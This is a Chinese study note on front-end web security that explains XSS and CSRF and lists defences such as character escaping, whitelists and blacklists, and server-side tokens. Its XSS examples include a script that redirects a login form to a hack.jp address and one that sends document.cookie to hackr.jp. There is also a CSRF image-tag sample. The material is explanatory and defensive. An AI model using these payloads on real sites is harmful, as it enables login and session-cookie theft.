# Web 前端安全

__前言:__网络安全一直是风口浪尖，尤其这几年随着前端的发展和变化，前端的安全问题日益突出多学习。参考：《图解HTTP》

## XSS 跨站脚本攻击(Cross Site Scriping)

>定义：

* Cross-Site Scripting 指通过存在安全漏洞的Web网站注册用户的浏览器内运行非法的HTML标签或js运行的一种攻击

>特点：

* 攻击者利用预先设置的陷阱触发的被动攻击
* 在动态生成HTML处生成

>场景：

* 登陆页表单验证

```HTML
ID <input type="text" name="ID" value=""><script> var f = document.getElementById("login"); f.action = "http://hack.jp/pwget";f.method = "get";</script><span s="" />
```

* 恶意构造脚本，窃取用户的Cookie信息

```HTML
<script src="http://hacker.jp/xss.js">
var content = escape(document.cookie);
document.write("<img src=http://hackr.jp/?");
document.write(content);
document.write(">");
```
补充：[有关编码函数escape](https://www.cnblogs.com/season-huang/p/3439277.html)

[讲的比较好的博文](https://blog.csdn.net/ghsau/article/details/17027893)

>代码层面的解决思路

首先要列出一份黑白名单，白名单放行，黑名单的话需要检测与拦截，
接下来的防范措施分4步：

1、识别内联脚本进行拦截
比如去寻找某标签中内嵌的"javascript:alert(1)"这种要用正则识别出来并且改成"javascript:void(0)",

2、重点字符如'<>',"",进行过滤转化为&lt,&gt,&quot等实体(比如我看到的腾讯官网在写简历的时候连双引号都给滤掉了)

3、重写document.write、apply、call等方法使其不能被篡改。

4、受到攻击时发邮件给程序员并完善黑名单。。。。（这种能发现的攻击就是已经被滤掉了的，只能完善黑名单，但并不能使本身系统变完善）

补充：白名单指的是允许的标签或属性等字段(黑名单相反)

[httphijack库解析](http://sbco.cc/2016/08/16/httphijack/)

## CSRF 跨站点请求伪造(Cross-site request forgery)

>定义：

* 攻击者通过设置好的陷阱，强制对已完成认证的用户进行非预期的个人信息或设定信息等某些状态更新，属于被动攻击。

>过程理解(以留言板为实际场景举例)

* 用户在留言板登陆，认证通过得到cookie：sid

* 攻击者在留言板上留下含恶意代码的评论如：

    ```HTML
    <img src="http://example.com/msg?q=你好">
    ```

* 用户触发陷阱，攻击者利用用户的权限发表用户非主观的动作（也就相当于是冒用别人的名义做一些事情），因为此时用户的浏览器的Cookie持有已认证的会话ID。

>代码层面的解决思路

不同的解决方案都有一个本质，那就是在客户端发送一个可以说加密也可以说复杂化的验证信息与服务器端的相对应才允许请求发送，这个真正有效且强大的方案还是要在服务器端进行，切图仔前辈在介绍xss攻击时也说到过高明的攻击会绕过前端的一切攻击。。。。看了下源码大致方案就是先checkuser，通过后服务器端生成了个hash的cookie通过res.setHeader里的set-cookie

[淘宝某工程师的解析](https://cnodejs.org/topic/4fb3bb6f1975fe1e13302cc7)

## 未完待续
